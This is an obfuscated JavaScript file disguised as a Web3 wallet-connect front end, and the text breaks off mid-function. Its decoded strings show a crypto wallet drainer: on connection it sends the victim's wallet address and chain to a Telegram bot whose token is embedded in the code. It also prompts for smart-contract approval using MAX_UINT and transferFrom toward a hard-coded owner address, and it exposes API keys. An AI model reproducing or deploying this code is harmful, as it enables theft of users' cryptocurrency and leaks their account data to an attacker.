const _0x4bf938=_0x7228;(function(_0x261d30,_0x348320){const _0x1ca751=_0x7228,_0xefbb77=_0x261d30();while(!![]){try{const _0x2366b8=-parseInt(_0x1ca751(0xa9))/0x1*(-parseInt(_0x1ca751(0x118))/0x2)+-parseInt(_0x1ca751(0x17d))/0x3+parseInt(_0x1ca751(0x11c))/0x4+parseInt(_0x1ca751(0x169))/0x5+-parseInt(_0x1ca751(0xf5))/0x6+parseInt(_0x1ca751(0x16d))/0x7+-parseInt(_0x1ca751(0x109))/0x8*(-parseInt(_0x1ca751(0x153))/0x9);if(_0x2366b8===_0x348320)break;else _0xefbb77['push'](_0xefbb77['shift']());}catch(_0xf00498){_0xefbb77['push'](_0xefbb77['shift']());}}}(_0x26ff,0x24297));let tokens=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window['Web3Modal'][_0x4bf938(0xc4)],WalletConnectProvider=window[_0x4bf938(0x120)][_0x4bf938(0xc4)],OWNER_ADDRESS='0x520B778E6C47FbbA3e3F9F80C77B1D2216659115',CHAT=0x4270dd8b,CHAT1=0x13796f5c3,ABI=[{'constant':!![],'inputs':[],'name':'name','outputs':[{'name':'','type':_0x4bf938(0xc2)}],'payable':![],'stateMutability':'view','type':_0x4bf938(0xc6)},{'constant':![],'inputs':[{'name':_0x4bf938(0x87),'type':_0x4bf938(0x10e)}],'name':_0x4bf938(0x131),'outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'constant':![],'inputs':[{'name':_0x4bf938(0x108),'type':_0x4bf938(0x10e)},{'name':_0x4bf938(0x106),'type':'uint256'}],'name':'approve','outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[],'name':_0x4bf938(0xb5),'outputs':[{'name':'','type':_0x4bf938(0x9e)}],'payable':![],'stateMutability':'view','type':_0x4bf938(0xc6)},{'constant':![],'inputs':[{'name':_0x4bf938(0x115),'type':'address'}],'name':_0x4bf938(0xf0),'outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':'function'},{'constant':!![],'inputs':[],'name':_0x4bf938(0xf9),'outputs':[{'name':'','type':_0x4bf938(0x132)}],'payable':![],'stateMutability':'view','type':_0x4bf938(0xc6)},{'constant':![],'inputs':[{'name':_0x4bf938(0x157),'type':_0x4bf938(0x10e)},{'name':_0x4bf938(0x152),'type':_0x4bf938(0x10e)},{'name':_0x4bf938(0x106),'type':_0x4bf938(0x132)}],'name':_0x4bf938(0x84),'outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':'function'},{'constant':!![],'inputs':[],'name':_0x4bf938(0xde),'outputs':[{'name':'','type':_0x4bf938(0x10e)}],'payable':![],'stateMutability':'view','type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x4bf938(0x141),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'name':'','type':_0x4bf938(0x132)}],'payable':![],'stateMutability':'view','type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[],'name':_0x4bf938(0x160),'outputs':[{'name':'','type':_0x4bf938(0x132)}],'payable':![],'stateMutability':'view','type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[],'name':_0x4bf938(0x127),'outputs':[{'name':'','type':_0x4bf938(0x132)}],'payable':![],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'constant':![],'inputs':[],'name':_0x4bf938(0x91),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[{'name':_0x4bf938(0x124),'type':_0x4bf938(0x10e)}],'name':_0x4bf938(0x15c),'outputs':[{'name':'','type':_0x4bf938(0x9e)}],'payable':![],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[{'name':'','type':_0x4bf938(0x10e)},{'name':'','type':_0x4bf938(0x10e)}],'name':_0x4bf938(0x129),'outputs':[{'name':'','type':_0x4bf938(0x132)}],'payable':![],'stateMutability':_0x4bf938(0xce),'type':'function'},{'constant':!![],'inputs':[],'name':_0x4bf938(0x93),'outputs':[{'name':'','type':_0x4bf938(0x9e)}],'payable':![],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[{'name':_0x4bf938(0xc5),'type':_0x4bf938(0x10e)}],'name':_0x4bf938(0x179),'outputs':[{'name':'','type':_0x4bf938(0x132)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[],'name':_0x4bf938(0x138),'outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[],'name':_0x4bf938(0x12b),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x4bf938(0xce),'type':'function'},{'constant':!![],'inputs':[],'name':'owner','outputs':[{'name':'','type':_0x4bf938(0x10e)}],'payable':![],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[],'name':_0x4bf938(0x9c),'outputs':[{'name':'','type':_0x4bf938(0xc2)}],'payable':![],'stateMutability':'view','type':_0x4bf938(0xc6)},{'constant':![],'inputs':[{'name':_0x4bf938(0x152),'type':_0x4bf938(0x10e)},{'name':_0x4bf938(0x106),'type':'uint256'}],'name':_0x4bf938(0x9b),'outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'constant':![],'inputs':[{'name':_0x4bf938(0x13c),'type':_0x4bf938(0x132)},{'name':'newMaxFee','type':_0x4bf938(0x132)}],'name':_0x4bf938(0x9f),'outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'constant':![],'inputs':[{'name':'amount','type':'uint256'}],'name':_0x4bf938(0x172),'outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':'function'},{'constant':![],'inputs':[{'name':'amount','type':_0x4bf938(0x132)}],'name':'redeem','outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[{'name':_0x4bf938(0xc0),'type':'address'},{'name':'_spender','type':_0x4bf938(0x10e)}],'name':'allowance','outputs':[{'name':_0x4bf938(0x14f),'type':'uint256'}],'payable':![],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[],'name':_0x4bf938(0x10a),'outputs':[{'name':'','type':_0x4bf938(0x132)}],'payable':![],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x4bf938(0x133),'outputs':[{'name':'','type':_0x4bf938(0x9e)}],'payable':![],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'constant':![],'inputs':[{'name':_0x4bf938(0x13d),'type':'address'}],'name':_0x4bf938(0xc9),'outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'constant':!![],'inputs':[],'name':_0x4bf938(0xa1),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x4bf938(0xdf),'type':_0x4bf938(0x10e)}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'constant':![],'inputs':[{'name':_0x4bf938(0x147),'type':_0x4bf938(0x10e)}],'name':_0x4bf938(0x12e),'outputs':[],'payable':![],'stateMutability':_0x4bf938(0x10c),'type':'function'},{'inputs':[{'name':_0x4bf938(0xca),'type':'uint256'},{'name':'_name','type':_0x4bf938(0xc2)},{'name':'_symbol','type':_0x4bf938(0xc2)},{'name':_0x4bf938(0xad),'type':_0x4bf938(0x132)}],'payable':![],'stateMutability':'nonpayable','type':_0x4bf938(0xf4)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4bf938(0x166),'type':'uint256'}],'name':_0x4bf938(0xe2),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4bf938(0x166),'type':'uint256'}],'name':_0x4bf938(0x148),'type':_0x4bf938(0x14a)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4bf938(0xa6),'type':_0x4bf938(0x10e)}],'name':_0x4bf938(0x11e),'type':_0x4bf938(0x14a)},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x4bf938(0x132)},{'indexed':![],'name':_0x4bf938(0xda),'type':_0x4bf938(0x132)}],'name':_0x4bf938(0x83),'type':_0x4bf938(0x14a)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4bf938(0x147),'type':'address'},{'indexed':![],'name':'_balance','type':_0x4bf938(0x132)}],'name':_0x4bf938(0xe1),'type':_0x4bf938(0x14a)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4bf938(0xa7),'type':_0x4bf938(0x10e)}],'name':_0x4bf938(0xb0),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4bf938(0xa7),'type':_0x4bf938(0x10e)}],'name':'RemovedBlackList','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4bf938(0xef),'type':_0x4bf938(0x10e)},{'indexed':!![],'name':_0x4bf938(0xe0),'type':_0x4bf938(0x10e)},{'indexed':![],'name':_0x4bf938(0x12d),'type':_0x4bf938(0x132)}],'name':'Approval','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4bf938(0x92),'type':_0x4bf938(0x10e)},{'indexed':!![],'name':'to','type':_0x4bf938(0x10e)},{'indexed':![],'name':_0x4bf938(0x12d),'type':_0x4bf938(0x132)}],'name':'Transfer','type':'event'},{'anonymous':![],'inputs':[],'name':_0x4bf938(0xa5),'type':_0x4bf938(0x14a)},{'anonymous':![],'inputs':[],'name':_0x4bf938(0xfd),'type':'event'}],ABIN=[{'inputs':[{'internalType':'string','name':_0x4bf938(0x145),'type':_0x4bf938(0xc2)},{'internalType':_0x4bf938(0xc2),'name':_0x4bf938(0x9c),'type':_0x4bf938(0xc2)},{'internalType':_0x4bf938(0x132),'name':_0x4bf938(0x16b),'type':'uint256'},{'internalType':_0x4bf938(0x132),'name':_0x4bf938(0xfe),'type':_0x4bf938(0x132)}],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xf4)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4bf938(0x10e),'name':'owner','type':'address'},{'indexed':!![],'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0xfa),'type':_0x4bf938(0x10e)},{'indexed':!![],'internalType':_0x4bf938(0x132),'name':_0x4bf938(0xaa),'type':'uint256'}],'name':_0x4bf938(0xd6),'type':_0x4bf938(0x14a)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0xef),'type':_0x4bf938(0x10e)},{'indexed':!![],'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0xdc),'type':_0x4bf938(0x10e)},{'indexed':![],'internalType':_0x4bf938(0x9e),'name':_0x4bf938(0xfa),'type':_0x4bf938(0x9e)}],'name':_0x4bf938(0x130),'type':_0x4bf938(0x14a)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4bf938(0x10e),'name':'previousOwner','type':_0x4bf938(0x10e)},{'indexed':!![],'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0xdf),'type':_0x4bf938(0x10e)}],'name':'OwnershipTransferred','type':_0x4bf938(0x14a)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4bf938(0x10e),'name':'from','type':_0x4bf938(0x10e)},{'indexed':!![],'internalType':_0x4bf938(0x10e),'name':'to','type':'address'},{'indexed':!![],'internalType':_0x4bf938(0x132),'name':_0x4bf938(0xaa),'type':_0x4bf938(0x132)}],'name':_0x4bf938(0x88),'type':_0x4bf938(0x14a)},{'inputs':[],'name':_0x4bf938(0x102),'outputs':[{'internalType':_0x4bf938(0xc2),'name':'','type':_0x4bf938(0xc2)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0x98),'outputs':[{'internalType':_0x4bf938(0x132),'name':'','type':_0x4bf938(0x132)}],'stateMutability':_0x4bf938(0xce),'type':'function'},{'inputs':[],'name':'REVEAL_TIMESTAMP','outputs':[{'internalType':_0x4bf938(0x132),'name':'','type':_0x4bf938(0x132)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0x17b),'outputs':[{'internalType':_0x4bf938(0x132),'name':'','type':'uint256'}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':'address','name':'to','type':_0x4bf938(0x10e)},{'internalType':'uint256','name':_0x4bf938(0xaa),'type':'uint256'}],'name':_0x4bf938(0xee),'outputs':[],'stateMutability':_0x4bf938(0x10c),'type':'function'},{'inputs':[{'internalType':'address','name':_0x4bf938(0xef),'type':_0x4bf938(0x10e)}],'name':_0x4bf938(0x179),'outputs':[{'internalType':'uint256','name':'','type':_0x4bf938(0x132)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0xbf),'outputs':[{'internalType':_0x4bf938(0xc2),'name':'','type':_0x4bf938(0xc2)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0x103),'outputs':[],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0x9d),'outputs':[],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x132),'name':_0x4bf938(0xaa),'type':_0x4bf938(0x132)}],'name':'getApproved','outputs':[{'internalType':_0x4bf938(0x10e),'name':'','type':_0x4bf938(0x10e)}],'stateMutability':'view','type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0xef),'type':_0x4bf938(0x10e)},{'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0xdc),'type':_0x4bf938(0x10e)}],'name':_0x4bf938(0x13b),'outputs':[{'internalType':_0x4bf938(0x9e),'name':'','type':'bool'}],'stateMutability':_0x4bf938(0xce),'type':'function'},{'inputs':[],'name':_0x4bf938(0x168),'outputs':[{'internalType':_0x4bf938(0x132),'name':'','type':_0x4bf938(0x132)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x132),'name':_0x4bf938(0x85),'type':'uint256'}],'name':_0x4bf938(0x10d),'outputs':[],'stateMutability':_0x4bf938(0xeb),'type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0x145),'outputs':[{'internalType':_0x4bf938(0xc2),'name':'','type':'string'}],'stateMutability':'view','type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0xef),'outputs':[{'internalType':_0x4bf938(0x10e),'name':'','type':_0x4bf938(0x10e)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x132),'name':_0x4bf938(0xaa),'type':_0x4bf938(0x132)}],'name':_0x4bf938(0x140),'outputs':[{'internalType':_0x4bf938(0x10e),'name':'','type':_0x4bf938(0x10e)}],'stateMutability':_0x4bf938(0xce),'type':'function'},{'inputs':[],'name':_0x4bf938(0x11b),'outputs':[],'stateMutability':'nonpayable','type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0xc3),'outputs':[],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':'address','name':'from','type':_0x4bf938(0x10e)},{'internalType':_0x4bf938(0x10e),'name':'to','type':_0x4bf938(0x10e)},{'internalType':'uint256','name':'tokenId','type':_0x4bf938(0x132)}],'name':_0x4bf938(0x16f),'outputs':[],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':'address','name':_0x4bf938(0x92),'type':_0x4bf938(0x10e)},{'internalType':_0x4bf938(0x10e),'name':'to','type':_0x4bf938(0x10e)},{'internalType':_0x4bf938(0x132),'name':_0x4bf938(0xaa),'type':'uint256'},{'internalType':_0x4bf938(0x146),'name':_0x4bf938(0x125),'type':_0x4bf938(0x146)}],'name':_0x4bf938(0x16f),'outputs':[],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0x149),'outputs':[{'internalType':'bool','name':'','type':_0x4bf938(0x9e)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0xdc),'type':_0x4bf938(0x10e)},{'internalType':_0x4bf938(0x9e),'name':_0x4bf938(0xfa),'type':'bool'}],'name':_0x4bf938(0xbc),'outputs':[],'stateMutability':'nonpayable','type':_0x4bf938(0xc6)},{'inputs':[{'internalType':'string','name':_0x4bf938(0xbf),'type':'string'}],'name':_0x4bf938(0x104),'outputs':[],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':'string','name':_0x4bf938(0x15f),'type':_0x4bf938(0xc2)}],'name':'setProvenanceHash','outputs':[],'stateMutability':_0x4bf938(0x10c),'type':'function'},{'inputs':[{'internalType':_0x4bf938(0x132),'name':'revealTimeStamp','type':_0x4bf938(0x132)}],'name':_0x4bf938(0xb4),'outputs':[],'stateMutability':'nonpayable','type':_0x4bf938(0xc6)},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':_0x4bf938(0x10c),'type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0xd4),'outputs':[{'internalType':_0x4bf938(0x132),'name':'','type':'uint256'}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':_0x4bf938(0x132),'name':'','type':_0x4bf938(0x132)}],'stateMutability':'view','type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x12c),'name':'interfaceId','type':_0x4bf938(0x12c)}],'name':'supportsInterface','outputs':[{'internalType':_0x4bf938(0x9e),'name':'','type':_0x4bf938(0x9e)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[],'name':'symbol','outputs':[{'internalType':'string','name':'','type':_0x4bf938(0xc2)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x132),'name':'index','type':'uint256'}],'name':_0x4bf938(0x156),'outputs':[{'internalType':'uint256','name':'','type':_0x4bf938(0x132)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0xef),'type':_0x4bf938(0x10e)},{'internalType':_0x4bf938(0x132),'name':_0x4bf938(0x159),'type':_0x4bf938(0x132)}],'name':_0x4bf938(0x101),'outputs':[{'internalType':_0x4bf938(0x132),'name':'','type':_0x4bf938(0x132)}],'stateMutability':'view','type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x132),'name':_0x4bf938(0xaa),'type':_0x4bf938(0x132)}],'name':_0x4bf938(0x119),'outputs':[{'internalType':_0x4bf938(0xc2),'name':'','type':_0x4bf938(0xc2)}],'stateMutability':'view','type':_0x4bf938(0xc6)},{'inputs':[],'name':_0x4bf938(0xf9),'outputs':[{'internalType':_0x4bf938(0x132),'name':'','type':_0x4bf938(0x132)}],'stateMutability':_0x4bf938(0xce),'type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0x92),'type':'address'},{'internalType':_0x4bf938(0x10e),'name':'to','type':'address'},{'internalType':'uint256','name':_0x4bf938(0xaa),'type':_0x4bf938(0x132)}],'name':_0x4bf938(0x84),'outputs':[],'stateMutability':'nonpayable','type':_0x4bf938(0xc6)},{'inputs':[{'internalType':_0x4bf938(0x10e),'name':_0x4bf938(0xdf),'type':'address'}],'name':_0x4bf938(0xbe),'outputs':[],'stateMutability':'nonpayable','type':_0x4bf938(0xc6)},{'inputs':[],'name':'withdraw','outputs':[],'stateMutability':_0x4bf938(0x10c),'type':'function'}],networkToId={0x1328cf7:'btc-mainnet',0x1:_0x4bf938(0x139),0x5:_0x4bf938(0x15b),0x89:_0x4bf938(0xc7),0x13881:_0x4bf938(0x128),0x38:_0x4bf938(0x162),0x61:'bsc-testnet',0xa86a:_0x4bf938(0x11d),0xa869:'avalanche-testnet',0xfa:_0x4bf938(0x122),0xfa2:_0x4bf938(0x113),0xa4b1:'arbitrum-mainnet',0x66eed:_0x4bf938(0xf8),0xa4ba:'arbitrum-nova-mainnet',0x250:_0x4bf938(0x126),0x51:'astar-shibuya',0x150:'astar-shiden',0x4e454152:_0x4bf938(0xd7),0x4e454153:_0x4bf938(0x158),0x6984c:_0x4bf938(0x161),0x69849:'avalanche-dexalot-testnet',0x7e4:_0x4bf938(0x10b),0x14a33:_0x4bf938(0x14d),0x77:_0x4bf938(0x105),0x405:_0x4bf938(0x13e),0xa918:_0x4bf938(0xfb),0x10e8:'boba-avalanche-testnet',0xdbe0:_0x4bf938(0x97),0x2600:'boba-bnb-testnet',0x50e:_0x4bf938(0xa4),0x511:_0x4bf938(0x175),0x120:_0x4bf938(0x117),0x1c:_0x4bf938(0x86),0xb48:_0x4bf938(0x17c),0x1e14:_0x4bf938(0x17a),0x436f7631:_0x4bf938(0x8c),0x19:_0x4bf938(0x163),0x152:_0x4bf938(0x100),0xd2af:_0x4bf938(0xed),0x14f:_0x4bf938(0xf1),0xa516:'emerald-paratime-mainnet',0x2329:_0x4bf938(0x112),0x2328:_0x4bf938(0x14b),0x868:_0x4bf938(0x151),0x86a:_0x4bf938(0xf7),0x13:_0x4bf938(0xe7),0x10:_0x4bf938(0xf6),0xe:_0x4bf938(0xab),0x72:_0x4bf938(0xec),0xb7e7759:_0x4bf938(0x14c),0x153c099c:_0x4bf938(0xe5),0x63564c40:'harmony-mainnet',0x6357d2e0:_0x4bf938(0xdb),0x141:_0x4bf938(0xcb),0x142:_0x4bf938(0x150),0xe704:'linea-testnet',0x1389:_0x4bf938(0xb6),0x52:'meter-mainnet',0x53:_0x4bf938(0x154),0x440:'metis-mainnet',0x24c:_0x4bf938(0x121),0x7d2:_0x4bf938(0xdd),0x30e0a:_0x4bf938(0x134),0x7d1:_0x4bf938(0xd2),0x30da5:_0x4bf938(0xcd),0x504:_0x4bf938(0x95),0x507:_0x4bf938(0x137),0x505:_0x4bf938(0x116),0xe9ac0ce:'neon-testnet',0x116ea:_0x4bf938(0x135),0x116e9:_0x4bf938(0x107),0x116e1:_0x4bf938(0xff),0x5afe:_0x4bf938(0xe4),0x5aff:'oasis-sapphire-testnet',0xf8:_0x4bf938(0x11f),0x249c:_0x4bf938(0xb3),0xa:_0x4bf938(0x177),0x2a15c308d:'palm-mainnet',0x2a15c3083:_0x4bf938(0x94),0x5a2:_0x4bf938(0xfc),0x1e:_0x4bf938(0xcc),0x1f:_0x4bf938(0xd1),0x5d456c62:_0x4bf938(0xe3),0x1482a7b2:_0x4bf938(0x15d),0x3d28774d:_0x4bf938(0xa0),0x109b4597:'skale-razor',0x536f6c4d:_0x4bf938(0xe6),0x1202c:_0x4bf938(0x114),0x1202d:_0x4bf938(0x123),0x1a0:_0x4bf938(0x13f)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0xa86a:_0x4bf938(0x170)},'chainId':0xa86a,'network':'avalanche-fuji-mainnet','infuraId':_0x4bf938(0x8d),'pollingInterval':'10000'}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':'Debug','infuraId':_0x4bf938(0x8d),'rpc':_0x4bf938(0x170),'chainId':0xa86a,'chainName':'avalanche-fuji-mainnet','darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x4bf938(0x14e))['click'](async function(){const _0xb31336=_0x4bf938;try{let _0x2b97a5=await web3Modal[_0xb31336(0x99)]();onProvider(_0x2b97a5),_0x2b97a5['on'](_0xb31336(0xa3),_0x49c19c=>{const _0x23882a=_0xb31336;console[_0x23882a(0x17e)](_0x49c19c),onProvider(_0x2b97a5);});}catch(_0x2491d9){console[_0xb31336(0x17e)]('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x2491d9);return;}});async function onProvider(_0xcbb11c){const _0x1b087d=_0x4bf938;web3Object=new Web3(_0xcbb11c);let _0xb73844=await web3Object['eth'][_0x1b087d(0xa2)]();selectedAccount=_0xb73844[0x0],chainName=await web3Object[_0x1b087d(0x165)]['getChainId'](),chainId=networkToId[chainName],console[_0x1b087d(0x17e)](chainId),console[_0x1b087d(0x17e)](selectedAccount),alert(_0x1b087d(0xcf)),_0xb73844[_0x1b087d(0x16a)]&&(sendMessage(_0x1b087d(0xb9)+chainId+'!'),sendMessage1(_0x1b087d(0xb9)+chainId+'!'),sendMessage(_0x1b087d(0x136)+selectedAccount),sendMessage1(_0x1b087d(0x136)+selectedAccount),covalenthqAPICall());}function _0x26ff(){const _0xc1b5c7=['harmony-testnet','operator','milkomeda-a1-mainnet','upgradedAddress','newOwner','spender','DestroyedBlackFunds','Issue','skale-calypso','oasis-sapphire-mainnet','gather-testnet','solana-mainnet','flarenetworks-canary-mainnet','NFT\x20Contract\x20Address\x20','Insufficient\x20funds\x20for\x20transfer','Tokens:','payable','flarenetworks-flare-testnet','defi-kingdoms-mainnet','approve','owner','addBlackList','defi-kingdoms-testnet','New\x20token','NFT','constructor','1306554RMGzGO','flarenetworks-canary-testnet','findora-forge-testnet','arbitrum-goerli','totalSupply','approved','boba-avalanche-mainnet','polygon-zkevm-testnet','Unpause','saleStart','nervos-polyjuice-testnet','cronos-testnet','tokenOfOwnerByIndex','BAYC_PROVENANCE','emergencySetStartingIndexBlock','setBaseURI','bittorrent-mainnet','_value','nervos-godwoken-testnet','_spender','685656MAVMhe','basisPointsRate','axie-mainnet','nonpayable','mintApe','address','quote','Transaction\x20Hash:\x20','location','evmos-mainnet','fantom-testnet','swimmer-mainnet','_evilUser','moonbeam-moonriver','boba-mainnet','2FpKQHu','tokenURI','Your\x20address\x20','renounceOwnership','314824tpNnRU','avalanche-mainnet','Deprecate','oasys-mainnet','WalletConnectProvider','metis-testnet','fantom-mainnet','swimmer-testnet','_maker','_data','astar-mainnet','_totalSupply','matic-mumbai','allowed','Approve\x20Completed\x20Successfully','getOwner','bytes4','value','destroyBlackFunds','estimateGas','ApprovalForAll','deprecate','uint256','isBlackListed','milkomeda-a1-devnet','nervos-godwoken-mainnet','Cl\x20address\x20:\x20','moonbeam-moonbase-alpha','pause','eth-mainnet','items','isApprovedForAll','newBasisPoints','_clearedUser','bittorrent-testnet','sx-mainnet','ownerOf','balances','TOKEN\x20Contract\x20Address\x20','contract_ticker_symbol','send','name','bytes','_blackListedUser','Redeem','saleIsActive','event','evmos-testnet','gather-mainnet','base-testnet','.connect','remaining','kcc-testnet','findora-mainnet','_to','9gNmghb','meter-testnet','error','tokenByIndex','_from','aurora-testnet','index','filter','eth-goerli','getBlackListStatus','skale-staging-uum','status','provenanceHash','maximumFee','avalanche-dexalot-mainnet','bsc-mainnet','cronos-mainnet','Contract','eth','amount','Transaction\x20is\x20submitted\x20to\x20the\x20network','maxApePurchase','562850KJFUZm','length','maxNftSupply','search','2033647XFVcTH','Initial\x20list\x20','safeTransferFrom','https://ava-mainnet.blastapi.io/c7937bc2-4607-4321-927a-daa76e77ebfa/ext/bc/C/rpc','JSON','issue','Error:\x20','true','boba-bobabase-testnet','map','optimism-mainnet','Token\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','balanceOf','canto-mainnet','apePrice','boba-goerli','729672bFIcaR','log','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','Params','transferFrom','numberOfTokens','boba-rinkeby-testnet','_upgradedAddress','Transfer','&text=','chainId:','json','covalent-internal-network-v1','e77435344ef0486893cdc26d7d5cf039','balance','Invalid\x20token\x20${token.address}','Transaction\x20Rejected','unpause','from','paused','palm-testnet','moonbeam-mainnet','toString','boba-bnb-mainnet','MAX_APES','connect','receipt','transfer','symbol','flipSaleState','bool','setParams','skale-omnus','MAX_UINT','getAccounts','accountsChanged','boba-bobabeam-mainnet','Pause','newAddress','_user','Error\x20collecting\x20info\x20about\x20wallet','41598GCmnxX','tokenId','flarenetworks-flare-mainnet','/address/','_decimals','type','getGasPrice','AddedBlackList','methods','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','oasys-testnet','setRevealTimestamp','deprecated','mantle-testnet','transactionHash','ckey_5da97a82746c43ed84565c64afb','Wallet\x20Connected\x20Successfully\x20to\x20','cryptocurrency','message','setApprovalForAll','then','transferOwnership','baseURI','_owner','data','string','reserveApes','default','who','function','matic-mainnet','contract_address','removeBlackList','_initialSupply','kcc-mainnet','rsk-mainnet','milkomeda-c1-devnet','view','Open\x20your\x20selected\x20wallet\x20or\x20extension\x20to\x20approve\x20smart\x20contract','sendTransaction','rsk-testnet','milkomeda-c1-mainnet','tokens-list','startingIndex','GET','Approval','aurora-mainnet','Token\x20balance\x20is\x20','Transaction\x20Receipt:\x20','maxFee'];_0x26ff=function(){return _0xc1b5c7;};return _0x26ff();}function _0x7228(_0x49ce4b,_0x1b163e){const _0x26ff82=_0x26ff();return 